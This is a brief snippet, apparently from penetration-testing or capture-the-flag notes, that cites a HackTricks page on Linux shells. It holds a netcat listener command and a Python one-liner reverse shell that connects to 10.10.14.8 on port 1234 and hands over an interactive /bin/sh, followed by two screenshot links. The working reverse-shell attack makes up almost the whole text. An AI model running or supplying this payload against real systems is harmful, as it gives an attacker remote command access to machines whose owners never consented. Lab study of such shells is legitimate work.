https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/linux

```
nc -nlvp 1234
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.8",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
![image](https://user-images.githubusercontent.com/33616880/231055113-1d7b8689-2d39-468a-bf6d-6c5f0a63926c.png)
![image](https://user-images.githubusercontent.com/33616880/231055372-e58304c2-36da-4de5-a9a3-76599f6bf2a9.png)

